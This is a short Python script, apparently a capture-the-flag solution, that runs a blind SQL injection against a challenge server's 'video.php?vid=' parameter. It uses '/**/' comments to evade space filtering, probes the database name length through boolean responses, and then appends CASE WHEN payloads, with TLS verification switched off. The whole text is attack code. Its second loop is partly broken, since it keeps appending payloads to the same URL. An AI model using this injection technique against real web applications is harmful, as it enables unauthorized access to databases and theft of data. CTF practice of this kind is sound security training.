import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://edu-ctf.csie.org:10159/video.php?vid='

for i in range(0, 100):
    url2 = url + '1/**/and/**/length(database())=' + str(i)
    print(url2)
    result = requests.get(url2, verify=False)
    if 'Error' not in result.text:
        print(result.text)

input()
for i in range(0, 255):
    print('---------------lognumber %d ----------'%(i))

    char = chr(i)
    payload = '(case/**/when/**/(' + char +')/**/then/**/1/**/else/**/2/**/end)'
    print(payload)
    url += payload
    result = requests.get(url, verify=False)

    #if 'Error' not in result.text and 'Bad cat!' not in result.text:
    print(result.text)
#print('--------------')
#print(result.headers)


